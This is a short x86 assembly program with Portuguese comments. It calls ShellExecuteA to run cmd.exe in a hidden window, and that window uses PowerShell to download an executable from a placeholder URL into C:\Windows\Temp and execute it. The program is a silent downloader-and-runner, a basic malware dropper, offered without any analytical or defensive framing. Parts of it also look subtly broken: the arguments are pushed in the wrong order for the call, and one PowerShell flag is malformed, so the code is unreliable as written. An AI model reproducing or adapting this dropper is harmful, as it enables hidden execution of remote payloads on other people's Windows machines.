extern _ShellExecuteA@20

; ---------------------------------------------------------
;   SECTION .data — Strings usadas pelo ShellExecuteA
; ---------------------------------------------------------
section .data
    operation   db 'open', 0                    ; operação para ShellExecute
    application db 'cmd.exe', 0                ; programa a ser executado

    arguments   db '/c powershell -Command '
                db 'wget "<URL>" '
                db '--OutFile C:\Windows\Temp\teste.exe '
                db '; C:\Windows\Temp\teste.exe', 0

; ---------------------------------------------------------
;   SECTION .text — Ponto de entrada do programa
; ---------------------------------------------------------
section .text
global _main

_main:
    ; Parâmetros do ShellExecuteA:
    ; HWND        = 0
    ; Operation   = operation
    ; File        = application
    ; Parameters  = arguments
    ; Directory   = 0
    ; ShowCmd     = 0

    push 0                ; hWnd
    push operation        ; Operation: "open"
    push application      ; File: "cmd.exe"
    push arguments        ; Parameters
    push 0                ; Directory
    push 0                ; ShowCmd

    call _ShellExecuteA@20

    ret
